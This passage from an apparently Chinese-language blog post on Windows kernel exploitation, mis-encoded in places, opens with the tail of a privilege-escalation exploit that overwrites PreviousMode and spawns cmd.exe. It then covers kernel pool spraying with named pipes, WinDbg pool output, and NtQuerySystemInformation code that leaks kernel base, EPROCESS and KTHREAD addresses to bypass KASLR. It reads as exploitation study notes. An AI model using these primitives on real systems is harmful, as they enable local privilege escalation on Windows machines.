class="line">		&amp;Token[<span class="number">2</span>],</span><br><span class="line">		<span class="number">8</span>,</span><br><span class="line">		&amp;BytesWritten</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// write back PreviousMode =&gt; 1</span></span><br><span class="line">	<span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line">	BYTE PreviousMode = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">NtWriteVirtualMemory</span>(</span><br><span class="line">		hCur,</span><br><span class="line">		(PVOID)(g_ExploitEthread + <span class="number">0x232</span>),</span><br><span class="line">		&amp;PreviousMode,</span><br><span class="line">		<span class="number">1</span>,</span><br><span class="line">		&amp;BytesWritten</span><br><span class="line">	))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error NtWriteVirtualMemory\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Get shell... \r\n&quot;</span>);</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="CLFS"><a href="#CLFS" class="headerlink" title="CLFS"></a>CLFS</h3><p>æäº†ä¸€å˜´ CLFSï¼Œå…¶UAFçš„åˆ©ç”¨</p>
<ul>
<li><a href="https://blog.exodusintel.com/2022/03/10/exploiting-a-use-after-free-in-windows-common-logging-file-system-clfs/">Exploiting a use-after-free in Windows Common Logging File System</a></li>
</ul>
<p>clfs.sys æ¼æ´ä¹Ÿè›®å¤šçš„</p>
<p>æ²‰æ·€ï¼Œtodoâ€¦</p>
<h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><p>å°è¯•è§£å†³é—®é¢˜æ—¶æœåˆ°äº†å…¶ä»–ä¸é”™çš„æ–‡ç« ï¼Œæ·±åº¦å­¦ä¹ ä¸€ä¸‹</p>
<h3 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h3><p>å¾®è½¯çš„å¥½ä¸œè¥¿æ€»æ˜¯éœ€è¦æˆ‘ä»¬è‡ªå·±æ¢ç´¢ã€‚</p>
<p>å·¥å…·ç®±ï¼š <a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/sysinternals-suite">Sysinternals Suite</a></p>
<h3 id="windows-driver-reverse"><a href="#windows-driver-reverse" class="headerlink" title="windows driver reverse"></a>windows driver reverse</h3><p><a href="https://voidsec.com/windows-drivers-reverse-engineering-methodology/">windows-drivers-reverse-engineering</a></p>
<p>æœ¬äººæ›´å–œæ¬¢ä½¿ç”¨ç½‘ç»œæ¥è¿›è¡Œwindbgè°ƒè¯•</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">PS&gt; bcdedit /dbgsettings <span class="built_in">NET</span> HOSTIP:&lt;DEBUGGER_IP&gt; PORT:<span class="number">50000</span></span><br><span class="line">PS&gt; bcdedit /debug on</span><br></pre></td></tr></table></figure>

<h4 id="Devices-Symlinks"><a href="#Devices-Symlinks" class="headerlink" title="Devices &amp; Symlinks"></a>Devices &amp; Symlinks</h4><p><strong>Devices are interfaces that let processes interact with the driver</strong>Â whileÂ <strong>Symlink is an alias you can use while calling Win32 functions</strong>.</p>
<ul>
<li><code>IoCreateDevice</code>Â creates DeviceNames:Â <code>\Device\VulnerableDevice</code></li>
<li><code>IoCreateSymbolicLink</code>Â creates Symlinks:Â <code>\\.\VulnerableDevice</code></li>
</ul>
<p>è®¾å¤‡çš„åç§°ï¼š</p>
<ul>
<li>è®¾å¤‡å‘½ååï¼Œå…¶å®ƒå†…æ ¸æ¨¡å¼éƒ¨ä»¶å¯ä»¥é€šè¿‡è°ƒç”¨IoGetDeviceObjectPointerå‡½æ•°æ‰¾åˆ°è¯¥è®¾å¤‡ï¼Œæ‰¾åˆ°è®¾å¤‡å¯¹è±¡åï¼Œå°±å¯ä»¥å‘è¯¥è®¾å¤‡çš„é©±åŠ¨ç¨‹åºå‘é€IRPã€‚</li>
<li>å…è®¸åº”ç”¨ç¨‹åºæ‰“å¼€å‘½åè®¾å¤‡çš„å¥æŸ„ï¼Œè¿™æ ·å®ƒä»¬å°±å¯ä»¥å‘é©±åŠ¨ç¨‹åºå‘é€IRPã€‚</li>
</ul>
<p><strong>ç¬¦å·é“¾æ¥åï¼š</strong> é©±åŠ¨ç¨‹åºä¸ºè®¾å¤‡åˆ›å»ºç¬¦å·é“¾æ¥ï¼Œåº”ç”¨ç¨‹åºå¯ä»¥ä½¿ç”¨ç¬¦å·é“¾æ¥åç§°æ¥è®¿é—®è®¾å¤‡</p>
<ul>
<li>è®¾å¤‡æ˜¯å¯ä»¥æ²¡æœ‰åå­—çš„ï¼Œä½†æ˜¯å¾—å­˜åœ¨ç¬¦å·é“¾æ¥ç”¨æˆ·æ€æ‰èƒ½è®¿é—®è®¾å¤‡</li>
</ul>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Sysinternals Suite é‡Œçš„ <code>winobj.exe</code> æ¥æŸ¥çœ‹ã€‚</p>
<ul>
<li>global æœç´¢ symlink å°±å¯ä»¥æ‰¾åˆ°device</li>
</ul>
<h4 id="Dispatch-Routines"><a href="#Dispatch-Routines" class="headerlink" title="Dispatch Routines"></a>Dispatch Routines</h4><p>æ´¾é£å‡½æ•° MajorFunction</p>
<h3 id="Windows-Kernel-HeapFengshui"><a href="#Windows-Kernel-HeapFengshui" class="headerlink" title="Windows Kernel HeapFengshui"></a>Windows Kernel HeapFengshui</h3><p><a href="https://www.alex-ionescu.com/kernel-heap-spraying-like-its-2015-swimming-in-the-big-kids-pool/">Windows HeapFengShui</a></p>
<p>è¿™ç¯‡æ–‡ç« ä¸»è¦ä»‹ç»äº†å†…æ ¸æ€çš„heap sprayingï¼Œåœ¨HEVD UAFæ—¶çœ‹è¿‡ï¼Œå†çœ‹å‡ é</p>
<p>é¦–å…ˆWindowså†…æ ¸ææƒæ‰‹æ®µ</p>
<ul>
<li>ä¿®æ”¹æƒé™ç›¸å…³çš„æ•°æ®ç»“æ„</li>
<li>å†…æ ¸æ€ROP</li>
</ul>
<p>Pool</p>
<ul>
<li>regular pool: å°‘äºä¸€ä¸ªå†…å­˜é¡µå¤§å°çš„åˆ†é…ï¼ŒX64ä¸‹å°äº4064å­—èŠ‚ï¼ˆ16å­—èŠ‚ç”¨äºæ± å¤´éƒ¨ï¼Œ16å­—èŠ‚åˆ†ç»™åˆå§‹çš„ç©ºé—²å—ï¼‰</li>
<li>big pool: å¤§äºäºä¸€ä¸ªå†…å­˜é¡µå¤§å°çš„åˆ†é…ï¼Œæ²¡æœ‰é¢„ç•™å¤´éƒ¨ç©ºé—´ï¼Œå†…å­˜é¡µæ˜¯é€šè¿‡<code>nt!PoolBigPageTable</code>æ¥ç´¢å¼•è·Ÿè¸ªçš„</li>
</ul>
<p>heap spray: Socketå’Œ NamedPipe</p>
<ul>
<li>åˆ›å»ºä¸€ä¸ªæœ¬åœ°Socketå¥—æ¥å­—å¹¶ç›‘å¬ï¼Œç”¨å¦å¤–ä¸€ä¸ªçº¿ç¨‹è¿æ¥è¯¥å¥—æ¥å­—ï¼Œç„¶åå‘å‡ºä¸€ä¸ªå†™æ“ä½œï¼ˆå†™çš„æ•°æ®è¦è¶…è¿‡4Kï¼‰ï¼Œä½†ä¸è¦è¯»ã€‚</li>
<li>åˆ›å»ºä¸€ä¸ªå‘½åç®¡é“ï¼Œç„¶åå‘å‡ºä¸€ä¸ªå†™æ“ä½œï¼ˆåŒæ ·æ•°æ®å¤§äº4Kï¼‰ï¼Œä¸”ä¸è¦è¯»ã€‚è¿™ä¹Ÿå°†å¯¼è‡´å‘½åç®¡é“æ–‡ä»¶ç³»ç»Ÿï¼ˆNPFS.SYSï¼‰ä¸ºç®¡é“æ•°æ®åˆ†é…ä¸€å—éåˆ†é¡µçš„å†…å­˜å—ã€‚</li>
<li>åŸå› æ˜¯å› ä¸º ç½‘ç»œæ ˆå‡½æ•°&#x2F;NPFSç¼“å†²åŒº æ“ä½œä½äºDISPATCH_LEVEL(IRQL 2)å±‚ï¼Œæ˜¯NonPagedPoolã€‚</li>
</ul>
<p>named pipe æ¯”è¾ƒç®€å•ï¼Œåªéœ€è¦å‡ è¡Œä»£ç å°±èƒ½æå®šã€‚ä½†æ˜¯NPFSä¼šåœ¨æˆ‘ä»¬è‡ªå·±çš„ç¼“å†²åŒºå‰é¢åŠ ä¸Šä¸€ä¸ªåŒ…å«å…¶è‡ªèº«å†…è”å¤´éƒ¨çš„å‰ç¼€ï¼Œè¯¥å‰ç¼€è¢«ç§°ä¸º<code>DATA_QUEUE_ENTRY</code>ã€‚NPFSå¤´éƒ¨çš„å¤§å°ä¼šéšç‰ˆæœ¬ä¸åŒè€Œç•¥æœ‰å·®å¼‚</p>
<p><a href="https://securityinsecurity.github.io/exploiting-hevd-use-after-free/">Windows Kernel Exploitation</a>æ–‡ç« é‡Œä½¿ç”¨è¿™ä¸ªæŠ€æœ¯ï¼ŒNPFS NpFrï¼š</p>
<ul>
<li>è°ƒç”¨ <code>CreatePipe</code> åˆ›å»ºreadPipeå’ŒwritePipe</li>
<li>ç„¶åWriteFileå¾€writePipeé‡Œå†™å…¥å†…å®¹</li>
<li>å­˜åœ¨ä¸€ä¸ª0x48å¤§å°çš„BUFFER_HEADERï¼Œåé¢è·Ÿç€æ•°æ®ï¼ŒNonPagedPool</li>
</ul>
<p>é€šè¿‡tagå¯»æ‰¾poolï¼Œè¿™ä¸ªå‘½ä»¤å¾ˆé•¿æ—¶é—´æ‰èƒ½å‡ºç»“æœã€‚å¦‚æœæƒ³çŸ¥é“poolå¤§å°ï¼Œå¯ä»¥ä½¿ç”¨<code>!poolused</code></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">!poolfind TagString [PoolType]</span><br></pre></td></tr></table></figure>

<p>è°ƒè¯•ä¸€ä¸‹</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE readPipe;</span><br><span class="line">	HANDLE writePipe;</span><br><span class="line">	BOOL res;</span><br><span class="line">	CHAR payload[<span class="number">0x30</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">RtlFillMemory</span>(payload, <span class="built_in">sizeof</span>(payload), <span class="number">0x43</span>);</span><br><span class="line"></span><br><span class="line">	res = <span class="built_in">CreatePipe</span>(&amp;readPipe, &amp;writePipe, <span class="literal">NULL</span>, <span class="built_in">sizeof</span>(payload));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!res)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;[-] Error CreatePipe&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">WriteFile</span>(writePipe, payload, <span class="built_in">sizeof</span>(payload), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;read: &quot;</span> &lt;&lt; readPipe &lt;&lt; <span class="string">&quot;write: &quot;</span> &lt;&lt; writePipe &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">DebugBreak</span>();</span><br><span class="line">	<span class="built_in">CloseHandle</span>(readPipe);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(writePipe);</span><br><span class="line">	<span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸¤ä¸ªhandleï¼ŒæŸ¥çœ‹å…¶ä¸­ä¸€ä¸ªHandleä¿¡æ¯ã€‚</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; !handle <span class="number">0</span>xA4</span><br><span class="line"></span><br><span class="line">PROCESS ffff9a8824cbd080</span><br><span class="line"><span class="function">    SessionId: <span class="title">none</span>  <span class="title">Cid</span>: 0004    <span class="title">Peb</span>: 00000000  <span class="title">ParentCid</span>: 0000</span></span><br><span class="line"><span class="function">    <span class="title">DirBase</span>: 001<span class="title">ad000</span>  <span class="title">ObjectTable</span>: <span class="title">ffffc98328c04040</span>  <span class="title">HandleCount</span>: 2813.</span></span><br><span class="line"><span class="function">    <span class="title">Image</span>: <span class="title">System</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Kernel</span> <span class="title">handle</span> <span class="title">table</span> <span class="title">at</span> <span class="title">ffffc98328c04040</span> <span class="title">with</span> 2813 <span class="title">entries</span> <span class="title">in</span> <span class="title">use</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">00<span class="title">a4</span>: <span class="title">Object</span>: <span class="title">ffff9a8826ffca20</span>  <span class="title">GrantedAccess</span>: 0012019<span class="title">f</span> (<span class="title">Protected</span>) (<span class="title">Inherit</span>) (<span class="title">Audit</span>) <span class="title">Entry</span>: <span class="title">ffffc98328cb2290</span></span></span><br><span class="line"><span class="function"><span class="title">Object</span>: <span class="title">ffff9a8826ffca20</span>  <span class="title">Type</span>: (<span class="title">ffff9a8824d1cae0</span>) <span class="title">File</span></span></span><br><span class="line"><span class="function">    <span class="title">ObjectHeader</span>: <span class="title">ffff9a8826ffc9f0</span> (<span class="title">new</span> <span class="title">version</span>)</span></span><br><span class="line"><span class="function">        <span class="title">HandleCount</span>: 1  <span class="title">PointerCount</span>: 32768</span></span><br><span class="line"><span class="function">        <span class="title">Directory</span> <span class="title">Object</span>: 00000000  <span class="title">Name</span>: \<span class="title">Device</span>\<span class="title">HarddiskVolume3</span>\$<span class="title">Extend</span>\$<span class="title">RmMetadata</span>\$<span class="title">TxfLog</span>\$<span class="title">TxfLog</span> &#123;<span class="title">clfs</span>&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">0: <span class="title">kd</span>&gt; !<span class="title">pool</span> <span class="title">ffff9a8826ffca20</span> 2</span></span><br><span class="line"><span class="function"><span class="title">Pool</span> <span class="title">page</span> <span class="title">ffff9a8826ffca20</span> <span class="title">region</span> <span class="title">is</span> <span class="title">Nonpaged</span> <span class="title">pool</span></span></span><br><span class="line"><span class="function">*<span class="title">ffff9a8826ffc9a0</span> <span class="title">size</span>:  190 <span class="title">previous</span> <span class="title">size</span>:    0  (<span class="title">Allocated</span>) *<span class="title">File</span></span></span><br><span class="line"><span class="function">		<span class="title">Pooltag</span> <span class="title">File</span> : <span class="title">File</span> <span class="title">objects</span></span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹å‡ºæ¥NonPagedå¤šäº†ä¸€ä¸ª0x70å¤§å°çš„å†…å­˜åŒºåŸŸã€‚å½“æˆ‘ä»¬æˆ‘ä»¬å†™å…¥0x28å¤§å°ï¼Œä¹Ÿæ˜¯0x70ï¼Œå­˜åœ¨å¯¹é½æƒ…å†µã€‚</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; !poolused <span class="number">1</span> NpFr</span><br><span class="line">Using a machine size of <span class="number">1</span>ffe7f pages to configure the kd cache</span><br><span class="line">........</span><br><span class="line"> Sorting by Tag</span><br><span class="line"></span><br><span class="line">                            NonPaged                                         Paged</span><br><span class="line"> Tag       Allocs       Frees      Diff         Used       Allocs       Frees      Diff         Used</span><br><span class="line"></span><br><span class="line"> NpFr        <span class="number">2905</span>        <span class="number">2904</span>         <span class="number">1</span>          <span class="number">112</span>            <span class="number">0</span>           <span class="number">0</span>         <span class="number">0</span>            <span class="number">0</span>	DATA_ENTRY records (read/write buffers) , Binary: npfs.sys</span><br><span class="line"></span><br><span class="line">TOTAL        <span class="number">2905</span>        <span class="number">2904</span>         <span class="number">1</span>          <span class="number">112</span>            <span class="number">0</span>           <span class="number">0</span>         <span class="number">0</span>            <span class="number">0</span></span><br></pre></td></tr></table></figure>


<p>å¤šæ¬¡å†™ 0x30 å¤§å°</p>
<ul>
<li>å†™ä¸¤æ¬¡ï¼Œå°±ä¼šæ˜¯0xe0 &#x3D;&gt; 0x70 * 2</li>
<li>3æ¬¡ï¼Œ0x150 &#x3D; 0x70 * 3</li>
</ul>
<p><a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/debuggercmds/-poolfind">poolfind (WinDbg)</a>ï¼Œåœ¨æœ¬æœºä¸€ä¸ªå¤šå°æ—¶è¿˜æ˜¯å‡ºä¸äº†ç»“æœğŸ¤£</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; !poolfind NpFr -nonpaged</span><br></pre></td></tr></table></figure>

<h3 id="NtQuerySystemInformation"><a href="#NtQuerySystemInformation" class="headerlink" title="NtQuerySystemInformation"></a>NtQuerySystemInformation</h3><p>æ–‡ç« ä¸­æåˆ°ç»•è¿‡ KASLR çš„ä¸€ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å¯ä»¥åœ¨<code>ntdll.dll</code>ä¸­è·å–</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__kernel_entry NTSTATUS <span class="title">NtQuerySystemInformation</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out]       PVOID                    SystemInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            ULONG                    SystemInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] PULONG                   ReturnLength</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯Windowså¯èƒ½ä¼šé™åˆ¶ç”¨æˆ·æ¨¡å¼ä¸‹å¯¹ç³»ç»Ÿä¿¡æ¯çš„è®¿é—®æƒé™ï¼ŒåŒ…æ‹¬å¯¹<code>NtQuerySystemInformation</code>å‡½æ•°çš„è°ƒç”¨</p>
<p>æœ‰ä¸ªä¸é”™çš„ä»“åº“ï¼š<a href="https://github.com/sam-b/windows_kernel_address_leaks">windows_kernel_address_leaks</a></p>
<h4 id="SystemModuleInformation"><a href="#SystemModuleInformation" class="headerlink" title="SystemModuleInformation"></a>SystemModuleInformation</h4><p>æ•…åæ€æ„ï¼ŒæŸ¥è¯¢æ¨¡å—çš„åŸºåœ°å€</p>
<p>from: <a href="https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit/">HEVD Exploits</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">INT64 <span class="title">get_kernel_base</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;[&gt;] Getting kernel base address...&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//https://github.com/koczkatamas/CVE-2016-0051/blob/master/EoP/Shellcode/Shellcode.cpp</span></span><br><span class="line">    <span class="comment">//also using the same import technique that @tekwizz123 showed us</span></span><br><span class="line"></span><br><span class="line">    PNtQuerySystemInformation NtQuerySystemInformation =</span><br><span class="line">        (PNtQuerySystemInformation)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>),</span><br><span class="line">            <span class="string">&quot;NtQuerySystemInformation&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!NtQuerySystemInformation) </span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;[!] Failed to get the address of NtQuerySystemInformation.&quot;</span> &lt;&lt; endl;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;[!] Last error &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; endl;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ULONG len = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">NtQuerySystemInformation</span>(SystemModuleInformation,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        &amp;len);</span><br><span class="line"></span><br><span class="line">    PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)</span><br><span class="line">        <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>,</span><br><span class="line">            len,</span><br><span class="line">            MEM_RESERVE | MEM_COMMIT,</span><br><span class="line">            PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    NTSTATUS status = <span class="built_in">NtQuerySystemInformation</span>(SystemModuleInformation,</span><br><span class="line">        pModuleInfo,</span><br><span class="line">        len,</span><br><span class="line">        &amp;len);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (status != (NTSTATUS)<span class="number">0x0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;[!] NtQuerySystemInformation failed!&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PVOID kernelImageBase = pModuleInfo-&gt;Modules[<span class="number">0</span>].ImageBaseAddress;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;[&gt;] ntoskrnl.exe base address: 0x&quot;</span> &lt;&lt; hex &lt;&lt; kernelImageBase &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (INT64)kernelImageBase;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡å…¶NameæŸ¥è¯¢æŒ‡å®šæ¨¡å—åŸºå€ <code>SYSTEM_MODULE_INFORMATION-&gt;Modules[ModulesCount].Name</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">SYSTEM_MODULE</span> &#123;</span><br><span class="line">	ULONG                Reserved1;</span><br><span class="line">	ULONG                Reserved2;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">	ULONG				Reserved3;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	PVOID                ImageBaseAddress;</span><br><span class="line">	ULONG                ImageSize;</span><br><span class="line">	ULONG                Flags;</span><br><span class="line">	WORD                 Id;</span><br><span class="line">	WORD                 Rank;</span><br><span class="line">	WORD                 w018;</span><br><span class="line">	WORD                 NameOffset;</span><br><span class="line">	CHAR                 Name[MAXIMUM_FILENAME_LENGTH];</span><br><span class="line">&#125;SYSTEM_MODULE, *PSYSTEM_MODULE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">SYSTEM_MODULE_INFORMATION</span> &#123;</span><br><span class="line">	ULONG                ModulesCount;</span><br><span class="line">	SYSTEM_MODULE        Modules[<span class="number">1</span>];</span><br><span class="line">&#125; SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;</span><br></pre></td></tr></table></figure>

<h4 id="SystemExtendedHandleInformation"><a href="#SystemExtendedHandleInformation" class="headerlink" title="SystemExtendedHandleInformation"></a>SystemExtendedHandleInformation</h4><p>é€šè¿‡å…¶æŒ‡å®šçš„handle(<code>SYSTEM_HANDLE_INFORMATION_EX-&gt;Handles[HandleCount].UniqueProcessId</code>)æŸ¥è¯¢Object</p>
<p>Handle</p>
<ul>
<li>Processçš„Handleï¼ŒEPROCESS</li>
<li>Threadçš„Handle, ETHREAD<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_SYSTEM_HANDLE</span></span><br><span class="line">&#123;</span><br><span class="line">	PVOID Object;</span><br><span class="line">	HANDLE UniqueProcessId;</span><br><span class="line">	HANDLE HandleValue;</span><br><span class="line">	ULONG GrantedAccess;</span><br><span class="line">	USHORT CreatorBackTraceIndex;</span><br><span class="line">	USHORT ObjectTypeIndex;</span><br><span class="line">	ULONG HandleAttributes;</span><br><span class="line">	ULONG Reserved;</span><br><span class="line">&#125; SYSTEM_HANDLE, *PSYSTEM_HANDLE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_SYSTEM_HANDLE_INFORMATION_EX</span></span><br><span class="line">&#123;</span><br><span class="line">	ULONG_PTR HandleCount;</span><br><span class="line">	ULONG_PTR Reserved;</span><br><span class="line">	SYSTEM_HANDLE Handles[<span class="number">1</span>];</span><br><span class="line">&#125; SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>æŸ¥è¯¢pidä¸º4ï¼ŒHandleValueä¸º4, objectä»£è¡¨SYSTEMè¿›ç¨‹EPROCESSçš„åœ°å€ï¼Œä»è€Œå¯ä»¥è·å¾—tokençš„åœ°å€</p>
<p>ETHREAD(KTHREAD) çš„åœ°å€ï¼šå½“HandleValueä¸ºå½“å‰æŒ‡å®šçš„Thread</p>
<ul>
<li>Threadå¯ä»¥OpenThreadæŒ‡å®š</li>
<li>è¿˜å¯ä»¥åœ¨Processä¸­CreateThread</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">HANDLE hThread = <span class="built_in">OpenThread</span>(THREAD_QUERY_INFORMATION, FALSE, <span class="built_in">GetCurrentThreadId</span>());</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> z = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; system_handle_info-&gt;NumberOfHandles; i++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> ((HANDLE)system_handle_info-&gt;Handles[i].HandleValue == hThread)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (system_handle_info-&gt;Handles[i].ObjectTypeIndex == ObjectThreadType)</span><br><span class="line">		&#123;</span><br><span class="line">			z++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> array_size = z - <span class="number">1</span>;</span><br><span class="line">PVOID* kThread_array = <span class="keyword">new</span> PVOID[array_size];</span><br><span class="line">z = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; system_handle_info-&gt;NumberOfHandles; i++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> ((HANDLE)system_handle_info-&gt;Handles[i].HandleValue == hThread)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (system_handle_info-&gt;Handles[i].ObjectTypeIndex == ObjectThreadType)</span><br><span class="line">		&#123;</span><br><span class="line">			kThread_array[z] = system_handle_info-&gt;Handles[i].Object;</span><br><span class="line">			z++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] KTHREAD address: %p\n&quot;</span>, kThread_array[array_size]);</span><br></pre></td></tr></table></figure>

<h3 id="Scoop-the-Windows-10-pool"><a href="#Scoop-the-Windows-10-pool" class="headerlink" title="Scoop the Windows 10 pool!"></a>Scoop the Windows 10 pool!</h3><p>å†…æ ¸æ± </p>
<p><a href="https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf">SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1</a></p>
<p><a href="https://ghostasky.github.io/posts/2023-8-scoopthewindows10pool/">Scoop The Windows 10 Pool ç¿»è¯‘</a></p>
<p><a href="https://ashlq.github.io/2023/08/22/Windows10%E5%86%85%E6%A0%B8%E6%B1%A0%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/">Windows10å†…æ ¸æ± ç®¡ç†æœºåˆ¶ä¸åˆ©ç”¨æ–¹æ³• | Ash blog (ashlq.github.io)</a></p>
<p>æ¯”è¾ƒæ–°çš„ä¸€ç¯‡æ€»ç»“ï¼š<a href="https://xz.aliyun.com/t/13434?time__1311=mqmxnDBQqQq2D/D0Dx2DUEFxciD9WGrGYD">Windowså†…æ ¸åˆ©ç”¨å°æ€»ç»“</a></p>
<h4 id="pool"><a href="#pool" class="headerlink" title="pool"></a>pool</h4><p>ç”¨æˆ·æ€æ“ä½œåœ¨ <code>C\Windows\system32\ntdll.dll</code> ä¸­ï¼Œå¯ä»¥é€†å‘çœ‹çœ‹ã€‚</p>
